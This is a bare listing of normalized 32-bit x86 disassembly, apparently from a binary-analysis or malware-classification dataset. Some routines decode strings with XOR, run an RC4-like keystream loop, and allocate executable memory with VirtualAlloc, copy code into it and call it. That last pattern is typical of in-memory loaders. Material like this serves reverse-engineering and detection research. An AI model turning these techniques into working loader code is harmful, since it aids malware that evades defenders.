mov eax [ edx ]
mov ecx [ eax ]
lea edx [ ebp - 0x28 ]
push edx
push esi
push eax
mov eax [ ecx + 0x104 ]
call eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
sub eax 0x4
add ecx 0x4
add esi 0x4
cmp eax 0x4
jae r-xdata
push esi
call [ SysFreeString@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor eax eax
cmp eax 0x1
jbe r-xdata
inc eax
cmp eax 0xf
jb r-xdata
push esi
call [ SysFreeString@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov dl [ ecx + 0x1 ]
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ ecx + 0x2 ]
cmp al [ esi + 0x2 ]
jne r-xdata
sub_10070772
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_10070810
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + r--data ]
xor cl cl
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] 0x0
retn
push esi
xor esi esi
mov edx [ eax ]
mov dl [ edx + esi ]
xor dl [ eax + 0x8 ]
xor dl cl
inc cl
mov [ esi + edi ] dl
movzx esi cl
cmp esi [ eax + 0x4 ]
jb r-xdata
mov eax [ eax + 0x4 ]
mov [ edi + eax ] 0x0
pop esi
retn
sub_1007084d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebx + 0x10 ]
mov esi ecx
cmp edi eax
jae r-xdata
sub edi eax
cmp [ ebp + 0x10 ] edi
jae r-xdata
push r--data
call sub_1002d84e
cmp esi ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push 0x0
push edi
call sub_1001eb83
test al al
je r-xdata
push 0xffffffff
add edi eax
push edi
call sub_10071c21
push [ ebp + 0xc ]
mov ecx esi
push 0x0
call sub_10071c21
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
lea ebx [ edi + edi ]
push ebx
lea eax [ eax + edx * 2 ]
push eax
push ecx
call sub_1007f5d0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
sub_100708f0
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xa0 ]
lea edx [ ebp - 0xa4 ]
mov esi ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
call sub_100185d0
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x26
mov [ ebp - 0x9c ] ebx
call sub_10053240
lea ecx [ ebp - 0x9c ]
push ecx
push edx
call sub_100724e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0xfb
call sub_10053240
mov ebx 0x1
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xcb
call sub_10053240
mov edx [ ebp - 0xa4 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xa0 ]
push eax
call esi
mov ecx [ ebp - 0x9c ]
push ecx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax [ ebp - 0x9c ]
push eax
call sub_10035937
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xa4 ]
add esp 0x4
push eax
call sub_1004ddc0
jmp r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
sub_100709fb
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002b37e
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_10070a90
push esi
mov esi [ eax ]
push edi
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ lstrcmpW@IAT ]
mov edi edi
test esi esi
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn
mov ecx [ ebx + 0x4 ]
mov eax [ esi ]
push ecx
mov ecx [ eax + 0x4 ]
push ecx
call edi
test eax eax
je r-xdata
sub_10070ad0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008802a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1c ] edi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0xc ] ebx
sete cl
mov [ ebp - 0x18 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax ebx
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ eax + edi + 0x38 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x24 ]
push ebx
push esi
push eax
call edx
cmp eax esi
jne r-xdata
mov edx 0x4
jmp r-xdata
mov esi eax
call sub_1004ef40
mov [ ebp - 0x14 ] 0x4
cmp edx ebx
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
add ecx edi
test edx edx
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_1005b90d
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10035c70
push 0x0
call sub_1001bdc0
or eax 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
sub_10070b8b
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_1001bdc0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10070c30
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec edi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov [ ecx ] si
movzx eax si
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_10070ca0
push ebp
mov ebp esp
cmp [ ebx ] 0x0
mov [ edx ] 0x0
jbe r-xdata
pop ebp
retn
push esi
mov esi [ eax * 4 + rw-data ]
mov ecx [ rw-data ]
add ecx esi
and ecx 0x800000ff
mov [ rw-data ] eax
jns r-xdata
dec eax
or eax 0xffffff00
inc eax
mov [ edi ] esi
mov esi [ ecx * 4 + rw-data ]
mov [ eax * 4 + rw-data ] esi
mov esi [ edi ]
mov [ ecx * 4 + rw-data ] esi
mov eax [ eax * 4 + rw-data ]
add eax esi
and eax 0x800000ff
mov [ rw-data ] ecx
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov esi [ esi ]
mov [ ecx ] eax
mov ecx [ edx ]
mov al [ eax * 4 + rw-data ]
xor al [ ecx + esi ]
mov esi [ ebp + 0xc ]
mov esi [ esi ]
mov [ ecx + esi ] al
inc ecx
mov [ edx ] ecx
cmp ecx [ ebx ]
jb r-xdata
dec eax
or eax 0xffffff00
inc eax
mov eax [ rw-data ]
inc eax
and eax 0x800000ff
jns r-xdata
pop esi
sub_10070d66
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1005efca
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1005c1c5
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_1004883d
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
sub_10070dd7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_1005bb4f
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1006299d
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_1001e7b9
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_10070e50
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
jmp edx
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x1 ]
mov [ ecx ] edx
movzx eax [ eax ]
retn
sub_10070e80
push edi
mov edi eax
cmp edi esi
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_100404a0
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
push 0xffffffff
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push 0x0
add edi 0x70
push edi
lea ecx [ esi + 0x70 ]
mov [ esi + 0x6c ] eax
call sub_100404a0
sub_10070f14
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10062d93
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10070f60
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
push eax
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] ax
call sub_100404a0
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10070f8e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_10070fc0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10061dab
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
pop ecx
sub_10071020
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10057d80
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb0
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0xbc ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x3c ]
mov eax 0xb
call sub_10049e00
lea edx [ ebp - 0x2c ]
mov eax 0x1d
call sub_10049e00
lea edx [ ebp - 0xb8 ]
mov eax 0x24
call sub_10049e00
lea edi [ esi + 0xda0 ]
push edi
mov ecx esi
call sub_10016a70
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov edx edi
lea ecx [ ebp - 0x2c ]
call sub_10007fc0
cmp [ edi ] ax
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
mov edx edi
lea ecx [ ebp - 0x2c ]
call sub_10007fc0
cmp [ edi ] ax
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x5
call sub_10049e00
lea edi [ esi + 0xfa8 ]
push edi
mov ecx esi
call sub_10016a70
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov [ esi + 0x11b0 ] 0x1
jmp r-xdata
sub_10071140
push ebp
mov ebp esp
push 0xffffffff
push sub_100867c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10035d40
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0xc4
call sub_10053240
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1007127d
push 0x8
mov eax sub_100854a7
call sub_10013486
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_10059d69
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004a031
push eax
call sub_1000b3d2
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1000c356
push eax
call sub_1000b3d2
add esp 0xc
mov [ esi + 0xc ] eax
call sub_10005db3
mov [ esi + 0x10 ] eax
call sub_10013ab8
retn 0x4
sub_10071300
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a0db
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x80
call sub_10045930
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
nop
xor eax eax
jmp r-xdata
push sub_10068260
push sub_1000bda0
push 0x0
push eax
mov eax [ esi + 0x394 ]
mov [ esi + 0x40 ] 0x0
call eax
add esp 0x10
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_1005ddc0
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xdc ]
push edx
call sub_100187af
add esp 0x4
sub_10071410
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100888fd
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x847c
call sub_10080470
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8478 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8490 ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x8 ] 0x0
mov [ esp + 0x20 ] edi
jne r-xdata
xor eax eax
push 0x831c
push eax
lea ecx [ esp + 0x16e ]
push ecx
mov [ esp + 0x170 ] ax
call sub_1007f940
add esp 0xc
cmp [ edi + 0x98 ] 0x0
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ edi + 0x78 ]
mov ecx [ ecx + 0x78 ]
test ecx ecx
jne r-xdata
mov edx [ edi + 0x90 ]
push edx
lea esi [ edi + 0x70 ]
push esi
call sub_1005eda0
mov eax [ edi + 0x78 ]
mov eax [ eax + 0x50 ]
push 0x40
push 0x3000
push eax
push 0x0
mov [ edi + 0x9c ] eax
call [ VirtualAlloc@IAT ]
mov [ edi + 0x98 ] eax
test eax eax
jne r-xdata
mov ecx [ esp + 0x8490 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x8478 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x8c ]
cmp [ eax + ecx + 0x14 ] 0x2
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ecx + 0x50 ]
mov ecx [ esi + 0x1c ]
push edx
push ecx
push eax
call sub_1007f5d0
mov edx [ edi + 0x98 ]
add esp 0xc
push edx
mov eax esi
call sub_10049ef0
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0xf8
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10017cc0
add esp 0x8
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x0
call sub_100205a0
mov [ esp + 0x8498 ] 0xffffffff
cmp [ esp + 0x38 ] esi
jb r-xdata
mov edx [ eax + ecx + 0x1c ]
lea eax [ edx + eax + 0x4 ]
mov eax [ eax ]
xor eax eax
jmp r-xdata
mov ecx [ edi + 0x98 ]
add ecx eax
mov [ esp + 0x18 ] ecx
jne r-xdata
mov ebx [ edi + 0x98 ]
mov eax esi
call sub_10017e70
test eax eax
je r-xdata
lea edx [ esp + 0x94 ]
mov eax 0x4c
call sub_10045930
mov eax edx
push eax
lea ecx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x8
mov [ esp + 0x8498 ] 0x1
call sub_100205a0
lea ecx [ esp + 0x24 ]
mov [ esp + 0x8498 ] 0xffffffff
call sub_10019100
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov eax 0x3
jmp r-xdata
mov edx [ edi ]
mov eax [ edx + 0x8 ]
mov ecx edi
call eax
mov eax 0x2
jmp r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_100187af
add esp 0x4
lea edx [ esp + 0x104 ]
mov eax 0x152
call sub_10045930
lea edx [ esp + 0x128 ]
mov eax 0x84
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x7c ]
lea ebx [ edi + 0xc ]
push edx
call sub_10017cc0
push eax
lea edx [ esp + 0x110 ]
lea esi [ esp + 0x4c ]
mov [ esp + 0x84a4 ] 0x4
call sub_1001ccb0
add esp 0xc
push eax
lea edx [ esp + 0x168 ]
lea esi [ esp + 0x60 ]
mov [ esp + 0x849c ] 0x5
call sub_1001ccb0
add esp 0x4
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x6
call sub_100205a0
cmp [ esp + 0x70 ] esi
jb r-xdata
lea edx [ esp + 0x94 ]
mov eax 0x120
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10017cc0
add esp 0x8
mov esi 0x8
mov edx eax
mov ecx esi
mov [ esp + 0x8498 ] 0x3
call sub_100205a0
cmp [ esp + 0x38 ] esi
jb r-xdata
mov eax [ edi + 0x78 ]
mov ecx [ eax + 0x28 ]
mov eax [ edi + 0x98 ]
push 0x0
push 0x1
add ecx eax
push eax
call ecx
lea edx [ esp + 0x94 ]
mov eax 0x87
call sub_10045930
mov ecx edx
push ecx
lea edx [ esp + 0x28 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x8
mov [ esp + 0x8498 ] 0x2
call sub_100205a0
lea ecx [ esp + 0x24 ]
mov [ esp + 0x8498 ] 0xffffffff
call sub_10019100
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
mov eax 0x4
jmp r-xdata
xor ebx ebx
xor ecx ecx
mov [ esp + 0x70 ] 0x7
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] cx
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax [ esp + 0x5c ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x5
jmp r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ esp + 0x8498 ] 0xffffffff
mov [ esp + 0x54 ] 0x7
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] ax
cmp [ esp + 0x8c ] esi
jb r-xdata
mov edx [ esp + 0x40 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
lea eax [ edi + 0x2c ]
mov [ esp + 0x8c ] 0x7
mov [ esp + 0x88 ] ebx
mov [ esp + 0x78 ] dx
cmp [ eax + 0x14 ] esi
jb r-xdata
mov ecx [ esp + 0x78 ]
push ecx
call sub_100187af
add esp 0x4
push eax
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x1c ]
push ecx
call [ esp + 0x24 ]
mov edx [ esp + 0x10 ]
push edx
push esi
mov [ edi + 0x50 ] eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
mov esi eax
mov eax [ esp + 0x10 ]
push eax
push ecx
push esi
call sub_1007f5d0
mov edx [ esp + 0x1c ]
add esp 0xc
add edi 0xa0
lea eax [ esp + 0x18 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] edx
call sub_10023010
mov edx [ esp + 0x20 ]
mov eax [ edx + 0x78 ]
mov eax [ eax + 0x78 ]
test eax eax
jne r-xdata
mov eax [ eax ]
mov ecx [ edx + 0x8c ]
cmp [ ecx + eax + 0x14 ] 0x3
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ecx + eax + 0x1c ]
mov eax [ edx + 0x8c ]
mov eax [ ecx + eax + 0x8 ]
mov edx [ edx + 0x98 ]
lea ecx [ esp + 0x14 ]
push ecx
add edx eax
call edx
add esp 0x4
xor eax eax
sub_100718ac
push 0x38
mov eax sub_100857f0
call sub_1003fae8
mov eax [ ebp + 0x8 ]
